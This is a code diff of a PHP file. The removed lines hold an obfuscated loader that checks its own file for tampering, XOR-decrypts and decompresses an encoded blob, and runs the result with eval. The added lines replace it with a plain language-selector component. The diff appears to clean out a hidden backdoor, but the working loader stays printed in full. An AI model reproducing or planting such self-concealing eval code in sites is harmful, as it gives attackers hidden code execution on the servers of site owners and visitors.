@@ -1,24 +1,19 @@
 <?php
-$xqyhwva="7fade7977d43b42694d507b336913883";
-$ftkjqjj="5102535d51560c550e540357060507525c02560d0600035050060a54570f0952";
-$kqtbtlt="Hr5faWsq9lIpTyiIXy1UNHj4TDjtInB2Muirn0AlX4izAlRwfbPU3ITnmZEl/OaBncuPlF7dB1kq18CMYNHB5ZDH9za2BgfGm8NHh5K8hgBGYs5jgWzCds8pIR+msSs/BsAyiBLBGja1XJruvmgBXnuXwFY5AntAPhUYubdSXmiVEAhY03XbS7taioso/S3EAh/VBgM2evQ3UVhHIDB89Y3z210CMZETMz12aldIhj5YCO6GE5A0kW11MizreJ9n1Y8xU7c6E+5vbFPih0dlb0nBBAgZF0BIPK/IRKzsTwnqOA1Md4TQvx9JUJ0G6GwAwAiyFkUGq0yhQPngFgGT14JhpiFFUCE6pRxE9XEI4RUKdHFylWZUmRPGmINdI3qgoYflUshlKjZ7rkNW39GZQM5qe19J/BRBapf+N2pMewzSmTZ2EnYUfCBiJCFlhJJOchy2TFoUplX0jCb4ImdvVnfmZYDsnDK+CB58K9TUArdA+5g=";
-$zfpqwpbk=file_get_contents(__FILE__);
-$onhgna=str_replace($kqtbtlt,"",$zfpqwpbk);
-if(strpos($onhgna,"ec"."ho")!==false||strpos($onhgna,"pr"."int")!==false||strpos($onhgna,"var_"."dump")!==false||strpos($onhgna,"file_put_"."contents")!==false||strpos($onhgna,"fw"."rite")!==false){die();}
-$wfqprtbrxw=str_replace(array($xqyhwva,$ftkjqjj),array("SP_ce3657aa","KP_49e2bb83"),$zfpqwpbk);
-$eryeaxlmow=md5($wfqprtbrxw);
-$sslbhowlo=hex2bin($ftkjqjj);
-$lbnckjwshi="";
-$lvkgrjyvr=strlen($eryeaxlmow);
-for($xzgfunmn=0;$xzgfunmn<$lvkgrjyvr;$xzgfunmn++){
-$lbnckjwshi.=chr(ord($sslbhowlo[$xzgfunmn])^ord($eryeaxlmow[$xzgfunmn]));
-}
-$rxmyqgzpa=base64_decode($kqtbtlt);
-$baekkaa=strlen($rxmyqgzpa);
-$ivykvqnht="";
-$gvegwmqpv=strlen($lbnckjwshi);
-for($xzgfunmn=0;$xzgfunmn<$baekkaa;$xzgfunmn++){
-$ivykvqnht.=$rxmyqgzpa[$xzgfunmn]^$lbnckjwshi[$xzgfunmn%$gvegwmqpv];
-}
-$xcpcfukpv="gzun"."compress";
-eval('?>' . $xcpcfukpv($ivykvqnht) . '<?php ');
+/**
+ * Language Selector Component for Public Pages
+ * Replicates the exact functionality from hall_of_fame.php
+ */
+
+// Get current language from cookie or default to pt_PT
+$current_locale = $_COOKIE['locale'] ?? 'pt_PT';
+
+// Available languages
+$available_locales = ['pt_PT', 'en_US', 'es_ES', 'pl_PL', 'fr_FR'];
+?>
+
+<div id="language-selector-container" data-current-locale="<?= htmlspecialchars($current_locale) ?>"
+    data-available-locales='<?= json_encode($available_locales) ?>'>
+</div>
+
+<link rel="stylesheet" href="css/language_selector.css">
+<script src="js/language_selector.js"></script>
